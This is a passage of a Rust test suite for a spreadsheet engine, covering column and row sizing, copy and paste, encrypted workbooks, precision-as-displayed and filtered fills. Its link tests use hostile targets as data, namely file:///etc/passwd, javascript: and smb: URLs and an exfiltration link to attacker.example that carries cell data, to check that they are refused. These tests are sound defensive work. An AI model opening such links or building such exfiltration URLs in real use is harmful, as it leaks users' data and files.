    s.execute("home.columnWidth", json!({"sheet": null, "cols": "Data!C:C", "chars": 20})).unwrap();
    s.execute("home.rowHeight", json!({"sheet": 1, "rows": "1:1", "height": 40})).unwrap();
    s.execute("home.hideColumns", json!({"sheet": "Data", "cols": "E:E"})).unwrap();
    s.execute("home.defaultWidth", json!({"sheet": "Data", "width": 80})).unwrap();
    let data = sheet(&s, 1);
    assert_eq!(data.freeze, Some((1, 0)));
    assert_eq!((data.col_width(0), data.col_width(1), data.col_width(2), data.col_width(3)), (150.0, 145.0, 145.0, 145.0));
    assert_eq!(data.row_height(0), 40.0);
    assert!(data.cols.get(&4).is_some_and(|c| c.hidden));
    assert_eq!(data.default_col_width, 80.0);
    assert_eq!(sheet(&s, 0), before, "the active sheet is untouched");
    assert_eq!(s.doc().unwrap().wb.active_sheet(), 0);

    s.execute("view.freezePanes", json!({"cell": "Data!B3"})).unwrap();
    assert_eq!(sheet(&s, 1).freeze, Some((2, 1)));
    s.execute("view.unfreezePanes", json!({"sheet": "Data"})).unwrap();
    s.execute("view.freezeTopRow", json!({"sheet": "Data"})).unwrap();
    assert_eq!(sheet(&s, 1).freeze, Some((1, 0)));

    // The selection belongs to the active sheet: another sheet needs explicit lines or a cell, and
    // a prefix can't contradict `sheet`.
    assert!(s.execute("home.columnWidth", json!({"sheet": "Data", "width": 10})).is_err());
    s.execute("view.unfreezePanes", json!({"sheet": "Data"})).unwrap();
    assert!(s.execute("view.freezePanes", json!({"sheet": "Data"})).is_err());
    assert!(s.execute("home.columnWidth", json!({"sheet": "Sheet1", "cols": "Data!B:B", "width": 10})).is_err());
    assert!(s.execute("home.rowHeight", json!({"rows": "Nope!1:1", "height": 10})).is_err());
    assert_eq!(sheet(&s, 0), before);
}

#[test]
fn row_height_and_column_width_take_pixels_or_excel_units() {
    // `height` and `width` are pixels at 96 dpi (the model's unit); `points` and `chars` are
    // Excel's units, those of its Row Height and Column Width dialogs. A row is saved in points.
    let mut s = s();
    s.execute("home.rowHeight", json!({"rows": "1:1", "points": 30})).unwrap();
    s.execute("home.rowHeight", json!({"rows": "2:2", "height": 30})).unwrap();
    s.execute("home.rowHeight", json!({"rows": "3:3", "points": 409.5})).unwrap();
    s.execute("home.columnWidth", json!({"cols": "A:A", "chars": 8.43})).unwrap();
    s.execute("home.columnWidth", json!({"cols": "B:B", "width": 100})).unwrap();
    let sheet = s.doc().unwrap().wb.active().unwrap();
    assert_eq!([sheet.row_height(0), sheet.row_height(1), sheet.row_height(2)], [40.0, 30.0, 546.0]);
    assert_eq!([sheet.col_width(0), sheet.col_width(1)], [64.0, 100.0]);
    let bytes = gridcraft_xlsx::write_xlsx(&s.doc().unwrap().wb).unwrap();
    let mut zip = zip::ZipArchive::new(std::io::Cursor::new(bytes)).unwrap();
    let mut xml = String::new();
    std::io::Read::read_to_string(&mut zip.by_name("xl/worksheets/sheet1.xml").unwrap(), &mut xml).unwrap();
    for row in [r#"<row r="1" ht="30" customHeight="1""#, r#"<row r="2" ht="22.5" customHeight="1""#, r#"<row r="3" ht="409.5" customHeight="1""#] {
        assert!(xml.contains(row), "{row} missing from {xml}");
    }

    // Out of range, the message gives the limit in the unit that was passed.
    for (id, params, message) in [
        ("home.rowHeight", json!({"height": 547}), "Row height must be between 0 and 546 pixels (409.5 points)."),
        ("home.rowHeight", json!({"points": 410}), "Row height must be between 0 and 409.5 points."),
        ("home.columnWidth", json!({"width": 1801}), "Column width must be between 0 and 1800 pixels."),
        ("home.columnWidth", json!({"chars": 256}), "Column width must be between 0 and 255 characters."),
    ] {
        assert_eq!(s.execute(id, params).unwrap_err().to_string(), message);
    }

    // The parameter docs agents read (`list_commands`) name the unit.
    for (id, unit) in [
        ("home.rowHeight", "height: 20 (pixels) | points: 15"),
        ("home.columnWidth", "width: 64 (pixels) | chars: 8.43"),
        ("home.defaultWidth", "width: 64 (pixels)"),
    ] {
        let params = s.commands().into_iter().find(|c| c.id == id).map(|c| c.params).unwrap_or_default();
        assert!(params.contains(unit), "{id}: {params}");
    }
}

#[test]
fn copying_areas_that_share_rows_or_columns_pastes_them_as_one_block() {
    // Issue #348: Excel slides lined-up areas together; formulas travel as their values.
    let mut s = s();
    s.execute(
        "range.setValues",
        json!({"range": "A1", "values": [["a1", "b1", "c1", "d1"], [1, 2, 3, 4], ["a3", "b3", "c3", "d3"], ["a4", "b4", "c4", "d4"]]}),
    )
    .unwrap();
    s.execute("cell.set", json!({"cell": "C2", "input": "=A2+B2"})).unwrap();

    // Same rows, selected right to left: pasted left to right, B left out.
    s.execute("selection.set", json!({"range": "C1:C2,A1:A2"})).unwrap();
    let copied = s.execute("edit.copy", json!({})).unwrap();
    assert_eq!(copied["text"], "a1\tc1\n1\t3\n");
    s.execute("edit.paste", json!({"at": "F1"})).unwrap();
    assert_eq!(v(&s, "F1"), Value::text("a1"));
    assert_eq!(v(&s, "G1"), Value::text("c1"));
    assert_eq!(v(&s, "F2"), Value::Number(1.0));
    assert_eq!(v(&s, "G2"), Value::Number(3.0));
    assert!(s.doc().unwrap().wb.active().unwrap().cell(CellRef::parse("G2").unwrap()).unwrap().formula.is_none());
    assert!(v(&s, "H1").is_empty());
    assert_eq!(s.doc().unwrap().selection.current().a1(), "F1:G2");
    // The source is untouched.
    assert_eq!(v(&s, "B1"), Value::text("b1"));
    assert!(s.doc().unwrap().wb.active().unwrap().cell(CellRef::parse("C2").unwrap()).unwrap().formula.is_some());

    // Same columns: stacked, row 2 left out.
    s.execute("selection.set", json!({"range": "A1:B1,A3:B4"})).unwrap();
    assert_eq!(s.execute("edit.copy", json!({})).unwrap()["text"], "a1\tb1\na3\tb3\na4\tb4\n");
    s.execute("edit.paste", json!({"at": "F5"})).unwrap();
    for (cell, want) in [("F5", "a1"), ("G5", "b1"), ("F6", "a3"), ("G7", "b4")] {
        assert_eq!(v(&s, cell), Value::text(want), "{cell}");
    }
    assert!(v(&s, "F8").is_empty());

    // Whole columns are trimmed to the used rows like a single-area copy.
    s.execute("edit.undo", json!({"steps": 2})).unwrap();
    s.execute("selection.set", json!({"range": "B:B,D:D"})).unwrap();
    assert_eq!(s.execute("edit.copy", json!({})).unwrap()["text"], "b1\td1\n2\t4\nb3\td3\nb4\td4\n");
}

#[test]
fn copying_areas_that_do_not_line_up_is_refused_with_a_message() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [[1, 2, 3], [4, 5, 6], [7, 8, 9]]})).unwrap();
    s.execute("selection.set", json!({"range": "A1"})).unwrap();
    s.execute("edit.copy", json!({})).unwrap();
    for (range, cut) in [("A1:A2,C2:C3", false), ("A1:A2,C1:D3", false), ("A1:A2,A2:A3", false), ("A1:A2,A1:A2", false), ("A1:A2,C1:C2", true)] {
        s.execute("selection.set", json!({"range": range})).unwrap();
        let e = s.execute(if cut { "edit.cut" } else { "edit.copy" }, json!({})).unwrap_err().to_string();
        assert!(e.contains("This action won't work on multiple selections."), "{range}: {e}");
        assert_eq!(s.clipboard.as_ref().map(|c| c.range.a1()), Some("A1".into()), "{range}: the earlier copy stays");
    }
    // Paste Link can't point at a slid-together block.
    s.execute("selection.set", json!({"range": "A1:A2,C1:C2"})).unwrap();
    s.execute("edit.copy", json!({})).unwrap();
    assert!(s.execute("edit.pasteSpecial", json!({"what": "all", "link": true, "at": "E1"})).is_err());
    assert!(v(&s, "E1").is_empty());
}

#[test]
fn editing_a_date_cell_shows_a_date_not_the_serial() {
    let mut s = s();
    let at = CellRef::parse("A1").unwrap();
    s.execute("cell.set", json!({"cell": "A1", "input": "2026-03-04"})).unwrap();
    {
        let d = s.doc().unwrap();
        let sh = d.wb.active().unwrap();
        assert_eq!(crate::display::edit_text(&d.wb, sh, at), "2026-03-04");
    }
    // A format whose text cannot be typed back falls back to ISO.
    s.execute("home.formatCells", json!({"range": "A1", "style": {"num_fmt": "dddd, mmmm d"}})).unwrap();
    let d = s.doc().unwrap();
    let sh = d.wb.active().unwrap();
    assert_eq!(crate::display::edit_text(&d.wb, sh, at), "2026-03-04");
    // A time alone falls back to a time, not to day 0 of 1900 ("9 AM" would lose the 36 minutes).
    let mut s3 = self::s();
    s3.execute("cell.set", json!({"cell": "A1", "input": "0.4"})).unwrap();
    s3.execute("home.formatCells", json!({"range": "A1", "style": {"num_fmt": "h AM/PM"}})).unwrap();
    let d = s3.doc().unwrap();
    assert_eq!(crate::display::edit_text(&d.wb, d.wb.active().unwrap(), at), "09:36:00");
    // Plain numbers are untouched.
    let mut s2 = self::s();
    s2.execute("cell.set", json!({"cell": "A1", "input": "42"})).unwrap();
    let d = s2.doc().unwrap();
    assert_eq!(crate::display::edit_text(&d.wb, d.wb.active().unwrap(), at), "42");
}

/// A workbook with 42 in A1, saved as `.xlsx` and encrypted with `password`.
fn encrypted_book(password: &str) -> Vec<u8> {
    let mut src = s();
    src.execute("cell.set", json!({"cell": "A1", "input": "42"})).unwrap();
    let xlsx = crate::io::save_bytes(&src.doc().unwrap().wb, "book.xlsx").unwrap();
    gridcraft_xlsx::testing::encrypt_workbook(&xlsx, password)
}

#[test]
fn encrypted_workbooks_open_with_their_password() {
    const PW: &str = "synthetic-pw-5521";
    let b64 = crate::io::base64_encode(&encrypted_book(PW));
    let open = |s: &mut Session, password: Option<&str>| {
        let mut p = json!({"name": "Secret.xlsx", "base64": b64});
        if let Some(pw) = password {
            p["password"] = json!(pw);
        }
        s.execute("file.open", p)
    };
    let mut s = Session::new();

    // Programmatic open without a password: an error carrying the marker, never a dialog.
    let err = open(&mut s, None).unwrap_err().to_string();
    assert!(err.contains(crate::io::PASSWORD_REQUIRED), "{err}");
    assert!(err.contains("Secret.xlsx"), "{err}");
    assert!(s.take_ui_requests().is_empty(), "programmatic calls never open dialogs");
    assert!(s.documents().is_empty());

    // Wrong and empty passwords are "incorrect", and the password is never quoted.
    for wrong in ["not-it", ""] {
        let err = open(&mut s, Some(wrong)).unwrap_err().to_string();
        assert!(err.contains(crate::io::WRONG_PASSWORD), "{err}");
        assert!(wrong.is_empty() || !err.contains(wrong), "{err}");
    }
    assert!(s.documents().is_empty());

    // The right password opens it: no save path, the file name as title, the notice first.
    let r = open(&mut s, Some(PW)).unwrap();
    assert_eq!(r["warnings"][0], crate::io::DECRYPTED_NOTICE);
    assert_eq!(r["title"], "Secret.xlsx");
    assert_eq!(v(&s, "A1"), Value::Number(42.0));
    assert_eq!(s.doc().unwrap().path, None);
    // The notice belongs in the info bar, not a message box.
    assert!(!s.take_ui_requests().iter().any(|r| matches!(r, crate::UiRequest::Message(_))));
    let journal = serde_json::to_string(&s.journal).unwrap();
    assert!(!journal.contains(PW), "the password never reaches the journal");
}

#[test]
#[cfg(not(target_arch = "wasm32"))]
fn a_decrypted_workbook_never_overwrites_its_encrypted_original() {
    const PW: &str = "synthetic-pw-5522";
    let nonce = unique_nonce();
    let dir = std::env::temp_dir().join(format!("gridcraft-encrypted-{}-{nonce}", std::process::id()));
    std::fs::create_dir(&dir).unwrap();
    let path = dir.join("Secret.xlsx");
    let bytes = encrypted_book(PW);
    std::fs::write(&path, &bytes).unwrap();

    let mut s = s();
    s.execute("file.open", json!({"path": path, "password": PW})).unwrap();
    assert_eq!(s.doc().unwrap().path, None);
    s.take_ui_requests();
    s.execute("cell.set", json!({"cell": "A1", "input": "43"})).unwrap();
    s.execute("file.save", json!({})).unwrap();
    assert!(s.take_ui_requests().iter().any(|r| matches!(r, crate::UiRequest::Dialog(name, _) if name == "saveAs")));
    assert_eq!(std::fs::read(&path).unwrap(), bytes, "the encrypted original is untouched");
    std::fs::remove_dir_all(dir).unwrap();
}

#[test]
fn link_open_refuses_every_scheme_but_http_https_and_mailto() {
    let mut s = s();
    s.execute("insert.link", json!({"cell": "A1", "target": "file:///etc/passwd"})).unwrap();
    s.take_ui_requests();
    for url in ["file:///etc/passwd", "smb://h/s", "\\\\h\\s", "JAVASCRIPT:1"] {
        assert!(s.execute("link.open", json!({"url": url})).is_err(), "{url}");
    }
    assert!(s.execute("link.open", json!({"cell": "A1"})).is_err());
    assert!(s.take_ui_requests().is_empty());
    // A host's `Allow` policy opens web and e-mail addresses directly, and nothing else.
    s.link_policy = crate::links::LinkPolicy::Allow;
    for url in ["file:///etc/passwd", "smb://h/s", "\\\\h\\s", "JAVASCRIPT:1"] {
        assert!(s.execute("link.open", json!({"url": url})).is_err(), "{url}");
    }
    assert!(s.take_ui_requests().is_empty());
    s.execute("link.open", json!({"url": "HTTPS://example.org/a"})).unwrap();
    assert_eq!(s.take_ui_requests(), vec![crate::UiRequest::OpenUrl("HTTPS://example.org/a".into())]);
    s.execute("link.open", json!({"url": "B2"})).unwrap();
    assert!(s.take_ui_requests().is_empty());
}

/// #2181: `link.open` is reachable by the control channel, CLI, MCP and scripts, so by default it
/// opens no web or e-mail address (an exfiltration channel: `https://attacker/?d=<cell data>`)
/// and asks for no dialog either; only the host's confirmed path opens one.
#[test]
fn programmatic_link_open_never_opens_an_external_address_without_confirmation() {
    let mut s = s();
    assert_eq!(s.link_policy, crate::links::LinkPolicy::Confirm, "confirmation is the default");
    s.execute("cell.set", json!({"cell": "A1", "input": "secret"})).unwrap();
    s.execute("insert.link", json!({"cell": "B1", "target": "https://attacker.example/?d=secret"})).unwrap();
    s.execute("insert.link", json!({"cell": "C1", "target": "mailto:x@attacker.example"})).unwrap();
    s.take_ui_requests();
    for p in [
        json!({"url": "https://attacker.example/?d=secret"}),
        json!({"url": "http://attacker.example"}),
        json!({"target": "MAILTO:x@attacker.example"}),
        json!({"cell": "B1"}),
        json!({"cell": "C1"}),
    ] {
        let e = s.execute("link.open", p.clone()).unwrap_err().to_string();
        assert!(e.contains(crate::links::NEEDS_CONFIRMATION), "{p}: {e}");
    }
    assert!(s.take_ui_requests().is_empty(), "no OpenUrl and no dialog for a programmatic caller");
    assert!(s.execute_headless("link.open", json!({"cell": "B1"})).is_err());
    assert!(s.take_ui_requests().is_empty());
    // References still navigate.
    s.execute("link.open", json!({"url": "A1"})).unwrap();
    assert!(s.take_ui_requests().is_empty());

    // The host's confirmed path opens the allowed address, and still refuses every other scheme.
    assert_eq!(s.open_confirmed_link(" https://example.org/a ").unwrap(), json!({"opened": "https://example.org/a"}));
    assert_eq!(s.take_ui_requests(), vec![crate::UiRequest::OpenUrl("https://example.org/a".into())]);
    for url in ["file:///etc/passwd", "\\\\h\\s", "javascript:1", "x-custom://a", "\u{1}https://a.example"] {
        assert!(s.open_confirmed_link(url).is_err(), "{url:?}");
    }
    assert!(s.take_ui_requests().is_empty());
    s.open_confirmed_link("Sheet1!C3").unwrap();
    assert_eq!(s.doc().unwrap().selection.active, CellRef::new(2, 2));
}

#[test]
fn subtotal_109_recalculates_when_row_height_or_autofit_reveals_rows() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [[1], [2], [4], [8]]})).unwrap();
    s.execute("cell.set", json!({"cell": "C1", "input": "=SUBTOTAL(109,A1:A4)"})).unwrap();
    s.execute("home.hideRows", json!({"rows": "2:3"})).unwrap();
    assert_eq!(v(&s, "C1"), Value::Number(9.0));
    // A non-zero height unhides the rows (the fuzz found the stale SUBTOTAL).
    s.execute("home.rowHeight", json!({"rows": "2:3", "height": 60.0})).unwrap();
    assert_eq!(v(&s, "C1"), Value::Number(15.0));
    s.execute("home.hideRows", json!({"rows": "2:3"})).unwrap();
    assert_eq!(v(&s, "C1"), Value::Number(9.0));
    s.execute("home.autofitRowHeight", json!({"rows": "2:3"})).unwrap();
    assert_eq!(v(&s, "C1"), Value::Number(15.0));
}

#[test]
fn paste_special_validation_copies_the_rule() {
    let mut s = s();
    let ok = |s: &mut Session, cell: &str, input: &str| s.execute("data.validate", json!({"cell": cell, "input": input})).unwrap()["ok"] == true;
    s.execute("cell.set", json!({"cell": "A1", "input": "5"})).unwrap();
    s.execute("cell.set", json!({"cell": "C3", "input": "7"})).unwrap();
    s.execute("data.validation", json!({"range": "A1", "type": "whole", "operator": "greater", "formula1": "0"})).unwrap();
    s.execute("edit.copy", json!({"range": "A1"})).unwrap();
    s.execute("edit.pasteSpecial", json!({"what": "formats", "at": "E5"})).unwrap();
    assert!(ok(&mut s, "E5", "-1"));
    s.execute("edit.pasteSpecial", json!({"what": "validation", "at": "C3"})).unwrap();
    assert!(!ok(&mut s, "C3", "-1"));
    assert!(ok(&mut s, "C3", "1"));
    assert!(!ok(&mut s, "A1", "-1"));
    assert_eq!(s.execute("cell.get", json!({"cell": "C3"})).unwrap()["text"], json!("7"));
}

#[test]
fn paste_special_validation_moves_relative_references() {
    let mut s = s();
    let ok = |s: &mut Session, cell: &str, input: &str| s.execute("data.validate", json!({"cell": cell, "input": input})).unwrap()["ok"] == true;
    s.execute("cell.set", json!({"cell": "A1", "input": "50"})).unwrap();
    s.execute("data.validation", json!({"range": "A1", "type": "custom", "formula1": "=A1>10"})).unwrap();
    s.execute("edit.copy", json!({"range": "A1"})).unwrap();
    s.execute("edit.pasteSpecial", json!({"what": "validation", "at": "C3"})).unwrap();
    assert!(!ok(&mut s, "C3", "5"), "the pasted rule checks C3, not A1");
    assert!(ok(&mut s, "C3", "20"));
}

/// "Set precision as displayed" (formulas.calculationOptions `precisionAsDisplayed`). Behaviour
/// observed in Excel through COM with synthetic values: turning it on rounds existing constants
/// and formulas to their formats; constants typed or reformatted while it is on are rounded at
/// once (permanently: a wider format later doesn't bring digits back); General keeps full
/// precision; turning it off restores formulas on recalculation, not constants.
#[test]
fn precision_as_displayed_option() {
    let mut s = s();
    let num = |s: &Session, a: &str| v(s, a).as_f64().unwrap_or(f64::NAN);
    s.execute("cell.set", json!({"cell": "A1", "input": "1.23456"})).unwrap();
    s.execute("cell.set", json!({"cell": "A2", "input": "=A1*100"})).unwrap();
    s.execute("cell.set", json!({"cell": "A3", "input": "=7/3"})).unwrap();
    s.execute("cell.set", json!({"cell": "A4", "input": "0.333333333333333"})).unwrap();
    s.execute("home.numberFormat", json!({"range": "A1", "code": "0.00"})).unwrap();
    s.execute("home.numberFormat", json!({"range": "A3", "code": "0"})).unwrap();
    assert_eq!((num(&s, "A1"), num(&s, "A3")), (1.23456, 7.0 / 3.0));
    let r = s.execute("formulas.calculationOptions", json!({"precisionAsDisplayed": true})).unwrap();
    assert_eq!(r["precisionAsDisplayed"], true);
    assert_eq!((num(&s, "A1"), num(&s, "A2"), num(&s, "A3"), num(&s, "A4")), (1.23, 123.0, 2.0, 0.333333333333333));
    let r = s.execute("file.options", json!({})).unwrap();
    assert_eq!(r["calculation"]["precisionAsDisplayed"], true);
    // Typed while on: rounded to the cell's format, and dependents read the rounded value.
    s.execute("cell.set", json!({"cell": "A1", "input": "4.56789"})).unwrap();
    assert_eq!((num(&s, "A1"), num(&s, "A2")), (4.57, 457.0));
    s.execute("range.setValues", json!({"range": "A1", "values": [[5.43219]]})).unwrap();
    assert_eq!(num(&s, "A1"), 5.43);
    // Reformatting while on rounds a constant and a formula at once.
    s.execute("cell.set", json!({"cell": "B1", "input": "1.23456"})).unwrap();
    s.execute("cell.set", json!({"cell": "B2", "input": "=1.23456"})).unwrap();
    s.execute("cell.set", json!({"cell": "B3", "input": "=B1*100"})).unwrap();
    assert_eq!(num(&s, "B1"), 1.23456);
    s.execute("home.numberFormat", json!({"range": "B1:B2", "code": "0.0"})).unwrap();
    assert_eq!((num(&s, "B1"), num(&s, "B2"), num(&s, "B3")), (1.2, 1.2, 120.0));
    // The constant's digits are gone for good; the formula is rounded again from its result.
    s.execute("home.numberFormat", json!({"range": "B1:B2", "code": "0.0000"})).unwrap();
    assert_eq!((num(&s, "B1"), num(&s, "B2")), (1.2, 1.2346));
    // Undo brings the unrounded constant back.
    s.execute("edit.undo", json!({})).unwrap();
    s.execute("edit.undo", json!({})).unwrap();
    assert_eq!(num(&s, "B1"), 1.23456);
    // Saved with the workbook, and applied on recalculation after reopening.
    reopen(&mut s);
    assert!(s.doc().unwrap().wb.calc.precision_as_displayed);
    assert_eq!(num(&s, "A3"), 2.0);
    // Off: formulas get their full precision back, constants stay rounded.
    s.execute("formulas.calculationOptions", json!({"precisionAsDisplayed": false})).unwrap();
    assert_eq!((num(&s, "A1"), num(&s, "A3")), (5.43, 7.0 / 3.0));
}

/// Reformatting a cell a dynamic array spills into rounds that element as displayed: the cell
/// holds no stored value (the spill lives in `Sheet::spill`), so the edit changes only its
/// style, and the anchor must be recalculated for the element to be rounded.
#[test]
fn precision_as_displayed_rounds_a_reformatted_spill_cell() {
    let mut s = s();
    let num = |s: &Session, a: &str| v(s, a).as_f64().unwrap_or(f64::NAN);
    s.execute("cell.set", json!({"cell": "F1", "input": "=SEQUENCE(3,1,0.123,0.111)"})).unwrap();
    s.execute("formulas.calculationOptions", json!({"precisionAsDisplayed": true})).unwrap();
    s.execute("cell.set", json!({"cell": "G1", "input": "=SUM(F1:F3)"})).unwrap();
    let (f2, f3) = (0.123 + 0.111, 0.123 + 0.111 * 2.0);
    assert_eq!((num(&s, "F1"), num(&s, "F2"), num(&s, "F3")), (0.123, f2, f3));
    // Formatting a spill destination (the anchor is not in the edit) rounds just that element.
    s.execute("home.numberFormat", json!({"range": "F2", "code": "0.0"})).unwrap();
    assert_eq!((num(&s, "F1"), num(&s, "F2"), num(&s, "F3")), (0.123, 0.2, f3));
    assert_eq!(num(&s, "G1"), 0.123 + 0.2 + f3);
    // A range covering anchor and spill, and a whole column, round every element.
    s.execute("home.numberFormat", json!({"range": "F:F", "code": "0.00"})).unwrap();
    assert_eq!((num(&s, "F1"), num(&s, "F2"), num(&s, "F3")), (0.12, 0.23, 0.35));
    assert_eq!(num(&s, "G1"), 0.12 + 0.23 + 0.35);
    // Formatting a cell that no spill covers changes nothing.
    s.execute("home.numberFormat", json!({"range": "F4", "code": "0.0"})).unwrap();
    assert_eq!(num(&s, "F3"), 0.35);
}
#[test]
fn precision_as_displayed_enable_undoes_in_one_step() {
    let mut s = s();
    let num = |s: &Session, a: &str| v(s, a).as_f64().unwrap_or(f64::NAN);
    s.execute("cell.set", json!({"cell": "A1", "input": "1.23456"})).unwrap();
    s.execute("cell.set", json!({"cell": "A2", "input": "=A1*100"})).unwrap();
    s.execute("home.numberFormat", json!({"range": "A1", "code": "0.00"})).unwrap();
    s.execute("formulas.calculationOptions", json!({"precisionAsDisplayed": true})).unwrap();
    assert_eq!((num(&s, "A1"), num(&s, "A2")), (1.23, 123.0));
    // One undo brings back the constants and the flag together.
    s.execute("edit.undo", json!({})).unwrap();
    assert!(!s.doc().unwrap().wb.calc.precision_as_displayed);
    assert_eq!((num(&s, "A1"), num(&s, "A2")), (1.23456, 1.23456 * 100.0));
}

#[test]
fn precision_as_displayed_applies_in_manual_mode() {
    let mut s = s();
    let num = |s: &Session, a: &str| v(s, a).as_f64().unwrap_or(f64::NAN);
    s.execute("cell.set", json!({"cell": "A1", "input": "1.23456"})).unwrap();
    s.execute("cell.set", json!({"cell": "A2", "input": "=A1*100"})).unwrap();
    s.execute("home.numberFormat", json!({"range": "A1", "code": "0.00"})).unwrap();
    s.execute("formulas.calculationOptions", json!({"mode": "manual"})).unwrap();
    // Turning it on rounds the values at once, without a calculation.
    s.execute("formulas.calculationOptions", json!({"precisionAsDisplayed": true})).unwrap();
    assert_eq!((num(&s, "A1"), num(&s, "A2")), (1.23, 123.0));
    // Turning it off recalculates at once too: the formula reads the rounded constant.
    s.execute("formulas.calculationOptions", json!({"precisionAsDisplayed": false})).unwrap();
    assert_eq!((num(&s, "A1"), num(&s, "A2")), (1.23, 1.23 * 100.0));
}

#[test]
fn precision_as_displayed_on_a_protected_sheet_keeps_locked_constants() {
    let mut s = s();
    let num = |s: &Session, a: &str| v(s, a).as_f64().unwrap_or(f64::NAN);
    s.execute("cell.set", json!({"cell": "A1", "input": "1.23456"})).unwrap();
    s.execute("cell.set", json!({"cell": "A2", "input": "=A1*100"})).unwrap();
    s.execute("cell.set", json!({"cell": "B1", "input": "1.23456"})).unwrap();
    s.execute("home.numberFormat", json!({"range": "A1:B1", "code": "0.00"})).unwrap();
    s.execute("home.lockCell", json!({"range": "B1", "on": false})).unwrap();
    s.execute("review.protectSheet", json!({})).unwrap();
    // Turning the option on is not refused: the locked constant keeps its digits, the unlocked
    // one is rounded.
    s.execute("formulas.calculationOptions", json!({"precisionAsDisplayed": true})).unwrap();
    assert!(s.doc().unwrap().wb.calc.precision_as_displayed);
    assert_eq!((num(&s, "A1"), num(&s, "B1"), num(&s, "A2")), (1.23456, 1.23, 1.23456 * 100.0));
    // Reformatting a locked constant, on a sheet that allows formatting, keeps its digits too.
    s.execute("review.unprotectSheet", json!({})).unwrap();
    s.execute("review.protectSheet", json!({"formatCells": true})).unwrap();
    s.execute("home.numberFormat", json!({"range": "A1", "code": "0.0"})).unwrap();
    assert_eq!(num(&s, "A1"), 1.23456);
}

#[test]
fn precision_as_displayed_rounds_a_legacy_array_by_each_cell() {
    let mut s = s();
    let num = |s: &Session, a: &str| v(s, a).as_f64().unwrap_or(f64::NAN);
    s.execute("range.setValues", json!({"range": "A1", "values": [[1], [2]]})).unwrap();
    s.execute("home.numberFormat", json!({"range": "B1", "code": "0.00"})).unwrap();
    s.execute("home.numberFormat", json!({"range": "B2", "code": "0.0"})).unwrap();
    s.execute("selection.set", json!({"range": "B1:B2"})).unwrap();
    s.execute("cell.set", json!({"input": "=A1:A2/3", "array": true})).unwrap();
    assert_eq!((num(&s, "B1"), num(&s, "B2")), (1.0 / 3.0, 2.0 / 3.0));
    // Each element takes the format of the cell it lands in.
    s.execute("formulas.calculationOptions", json!({"precisionAsDisplayed": true})).unwrap();
    assert_eq!((num(&s, "B1"), num(&s, "B2")), (0.33, 0.7));
}

#[test]
fn precision_as_displayed_rounds_numbers_written_to_a_new_sheet() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [[1], [2], [4], [7], [3], [5]]})).unwrap();
    // Histogram output on a new sheet, with the option off, keeps full precision.
    s.execute("data.analysisToolPak", json!({"tool": "histogram", "range": "Sheet1!A1:A6", "cumulative": true, "newSheet": "Raw"})).unwrap();
    let raw: Vec<(CellRef, f64)> = {
        let d = s.doc().unwrap();
        let sh = d.wb.sheet(d.wb.sheet_index("Raw").unwrap()).unwrap();
        sh.cells
            .iter()
            .filter_map(|(c, cell)| match cell.value {
                Value::Number(n) if cell.formula.is_none() => Some((c, n)),
                _ => None,
            })
            .collect()
    };
    s.execute("formulas.calculationOptions", json!({"precisionAsDisplayed": true})).unwrap();
    s.execute("data.analysisToolPak", json!({"tool": "histogram", "range": "Sheet1!A1:A6", "cumulative": true, "newSheet": "Rounded"})).unwrap();
    let d = s.doc().unwrap();
    let si = d.wb.sheet_index("Rounded").unwrap();
    let sh = d.wb.sheet(si).unwrap();
    let mut prec = gridcraft_calc::DisplayedPrecision::new();
    let mut rounded = 0;
    for (c, n) in &raw {
        let want = prec.round(&d.wb, si, *c, *n);
        assert_eq!(sh.value(*c), Value::Number(want), "{c:?}");
        rounded += usize::from(want != *n);
    }
    // Cumulative shares of six values are sixths, which the percent format rounds.
    assert!(rounded > 0, "the histogram's formatted cells should be rounded");
}

/// #1101: repeating one cell or row down a filtered selection (paste, Ctrl+Enter, Fill Down) skips
/// the rows the filter hides, as in Excel. A taller pasted block goes straight down, and rows
/// hidden by hand are written, also as in Excel (each case measured in Excel for Microsoft 365).
#[test]
fn fills_and_single_row_pastes_skip_filtered_rows() {
    let fresh = s;
    let filtered = || {
        let mut s = fresh();
        let mut rows = vec![json!(["Val", "Tag"])];
        for i in 2..=11 {
            rows.push(json!([format!("v{i}"), if [3, 5, 7, 9].contains(&i) { "hide" } else { "keep" }]));
        }
        s.execute("range.setValues", json!({"range": "A1", "values": rows})).unwrap();
        s.execute("range.setValues", json!({"range": "E1", "values": [["X", "W"], ["Y", ""]]})).unwrap();
        s.execute("selection.set", json!({"range": "A1:B1"})).unwrap();
        s.execute("data.filter", json!({})).unwrap();
        assert_eq!(s.execute("data.filterBy", json!({"column": "B", "values": ["keep"]})).unwrap()["hiddenRows"], 4);
        s
    };
    let col = |s: &Session, c: &str| -> Vec<Value> { (2..=11).map(|r| v(s, &format!("{c}{r}"))).collect() };
    let skipped =
        |x: &str| -> Vec<Value> { (2..=11).map(|r| Value::from(if [3, 5, 7, 9].contains(&r) { format!("v{r}") } else { x.to_string() })).collect() };

    // One cell pasted over the filtered rows.
    let mut s = filtered();
    s.execute("edit.copy", json!({"range": "E1"})).unwrap();
    s.execute("selection.set", json!({"range": "A2:A11"})).unwrap();
    s.execute("edit.paste", json!({})).unwrap();
    assert_eq!(col(&s, "A"), skipped("X"));

    // One row (two cells) pasted over the filtered rows.
    let mut s = filtered();
    s.execute("edit.copy", json!({"range": "E1:F1"})).unwrap();
    s.execute("selection.set", json!({"range": "A2:B11"})).unwrap();
    s.execute("edit.paste", json!({})).unwrap();
    assert_eq!(col(&s, "A"), skipped("X"));
    assert_eq!(v(&s, "B3"), Value::from("hide"));
    assert_eq!(v(&s, "B4"), Value::from("W"));

    // A two-row block is pasted straight down, hidden rows included.
    let mut s = filtered();
    s.execute("edit.copy", json!({"range": "E1:E2"})).unwrap();
    s.execute("selection.set", json!({"range": "A2:A11"})).unwrap();
    s.execute("edit.paste", json!({})).unwrap();
    assert_eq!(col(&s, "A"), ["X", "Y", "X", "Y", "X", "Y", "X", "Y", "X", "Y"].map(Value::from));

    // Ctrl+Enter.
    let mut s = filtered();
    s.execute("selection.set", json!({"range": "A2:A11"})).unwrap();
    s.execute("range.fill", json!({"input": "Z"})).unwrap();
    assert_eq!(col(&s, "A"), skipped("Z"));

    // Fill Down, and a formula filled down still adjusts to the row it lands in.
    let mut s = filtered();
    s.execute("edit.fillDown", json!({"range": "A2:A11"})).unwrap();
    assert_eq!(col(&s, "A"), skipped("v2"));
